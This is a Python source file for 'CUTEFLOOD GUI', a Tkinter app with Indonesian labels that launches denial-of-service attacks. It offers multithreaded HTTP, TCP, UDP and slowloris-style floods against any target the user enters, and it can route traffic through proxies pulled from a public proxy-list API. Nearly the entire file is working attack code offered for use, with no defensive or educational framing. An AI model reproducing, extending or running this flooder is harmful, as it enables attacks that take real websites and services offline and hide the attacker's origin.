import tkinter as tk
from tkinter import ttk, messagebox
import threading, requests, random, socket, time
from urllib.parse import urlparse
import socks, ssl

# Smart header generator
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "curl/7.68.0", "python-requests/2.25.1", "Wget/1.20.3"
]

# Proxy list
proxies = []
def load_proxies():
    global proxies
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=https")
        proxies = list(set(r.text.strip().split('\r\n')))
    except:
        proxies = []

# Core Attack Methods
def http_flood(url, duration, use_proxy, stats):
    end = time.time() + duration
    while time.time() < end:
        try:
            proxy = {"http": f"http://{random.choice(proxies)}"} if use_proxy and proxies else None
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(url, headers=headers, proxies=proxy, timeout=3)
            stats["sent"] += 1
        except:
            continue

def tcp_flood(ip, port, duration, stats):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(random._urandom(1024))
            s.close()
            stats["sent"] += 1
        except:
            continue

def udp_flood(ip, port, duration, stats):
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end:
        try:
            sock.sendto(random._urandom(1024), (ip, port))
            stats["sent"] += 1
        except:
            continue

def slowloris(ip, port, duration, stats):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            stats["sent"] += 1
        except:
            continue

# Start attack
def start_attack(method, target, port, duration, threads, use_proxy, output_label):
    stats = {"sent": 0}
    parsed = urlparse(target)
    host = parsed.hostname or target
    url = target if parsed.scheme else f"http://{target}"

    def run():
        output_label.config(text="🚀 Serangan sedang berlangsung...")
        with open("attack_log.txt", "a") as log:
            log.write(f"Target: {target}, Method: {method}, Duration: {duration}s\n")
        funcs = {
            "HTTP": lambda: http_flood(url, duration, use_proxy, stats),
            "TCP": lambda: tcp_flood(host, port, duration, stats),
            "UDP": lambda: udp_flood(host, port, duration, stats),
            "Slowloris": lambda: slowloris(host, port, duration, stats)
        }
        for _ in range(threads):
            threading.Thread(target=funcs[method], daemon=True).start()
        time.sleep(duration)
        output_label.config(text=f"✅ Selesai! Total request terkirim: {stats['sent']}")
    threading.Thread(target=run).start()

# GUI
app = tk.Tk()
app.title("CUTEFLOOD GUI 😈🔥")
app.geometry("500x480")
app.config(bg="#222")

tk.Label(app, text="🎯 Target URL/IP:", bg="#222", fg="white").pack()
target_entry = tk.Entry(app, width=50)
target_entry.pack()

tk.Label(app, text="📍 Port (default: 80):", bg="#222", fg="white").pack()
port_entry = tk.Entry(app, width=10)
port_entry.insert(0, "80")
port_entry.pack()

tk.Label(app, text="💣 Attack Method:", bg="#222", fg="white").pack()
method_var = tk.StringVar()
method_menu = ttk.Combobox(app, textvariable=method_var, values=["HTTP", "TCP", "UDP", "Slowloris"])
method_menu.current(0)
method_menu.pack()

tk.Label(app, text="⏱️ Durasi (detik):", bg="#222", fg="white").pack()
duration_entry = tk.Entry(app, width=10)
duration_entry.insert(0, "60")
duration_entry.pack()

tk.Label(app, text="⚙️ Threads:", bg="#222", fg="white").pack()
thread_entry = tk.Entry(app, width=10)
thread_entry.insert(0, "100")
thread_entry.pack()

proxy_var = tk.BooleanVar()
proxy_check = tk.Checkbutton(app, text="🌀 Gunakan Proxy", variable=proxy_var, bg="#222", fg="white", selectcolor="#333")
proxy_check.pack()

output_label = tk.Label(app, text="💤 Menunggu perintah...", bg="#222", fg="#0ff")
output_label.pack(pady=10)

def launch():
    try:
        target = target_entry.get()
        port = int(port_entry.get())
        duration = int(duration_entry.get())
        threads = int(thread_entry.get())
        method = method_var.get()
        use_proxy = proxy_var.get()
        if use_proxy and not proxies:
            load_proxies()
        start_attack(method, target, port, duration, threads, use_proxy, output_label)
    except Exception as e:
        messagebox.showerror("Error", str(e))

tk.Button(app, text="🚀 MULAI SERANG!", command=launch, bg="#e91e63", fg="white", font=("Helvetica", 12, "bold")).pack(pady=15)

tk.Label(app, text="CUTEFLOOD GUI by Bro 😎", bg="#222", fg="#888").pack(pady=5)

app.mainloop()
